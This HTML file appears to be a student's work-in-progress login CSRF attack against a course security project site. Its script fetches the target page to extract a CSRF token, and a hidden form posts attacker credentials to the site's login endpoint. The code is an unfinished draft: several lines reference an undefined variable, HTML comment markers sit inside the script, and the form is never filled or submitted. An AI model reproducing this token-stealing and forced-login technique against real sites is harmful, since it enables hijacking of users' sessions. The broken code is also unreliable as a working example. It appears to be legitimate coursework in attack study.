<html>
  <body>
    <script>

    function callback(res){
      alert(res.text)
<!--      token = page.getElementsByName("csrf_token").value;-->
      token = res.querySelector('.well > form:nth-child(1) > input:nth-child(1)').value;
      alert(token)
    }

    function httpGetAsync(theUrl, callback)
    {
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.onreadystatechange = function() {
            if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
                callback(xmlHttp.response);
        }
        xmlHttp.open("GET", theUrl, true); // true for asynchronous
        xmlHttp.send(null);
    }

    httpGetAsync('https://project2.ecen4133.org/?csrfdefense=1&xssdefense=0', callback)

<!--    req.onload = function (e) {-->
<!--      page = req.response;-->
      token = page.getElementsByName("csrf_token").value;
      token = page.querySelector('.well > form:nth-child(1) > input:nth-child(1)').value;
<!--      alert(token);-->
<!--    };-->
<!--    alert(token);-->


    </script>

      <!-- https://project2.ecen4133.org/login?csrfdefense=0&xssdefense=4 -->
    <form action="https://project2.ecen4133.org/login?csrfdefense=1&xssdefense=0" method="POST">
      <input type="hidden" name="username" value="attacker" />
      <input type="hidden" name="password" value="l33th4x" />
      <input type="hidden" name="csrf_token" value="" />
    </form>

  </body>
</html>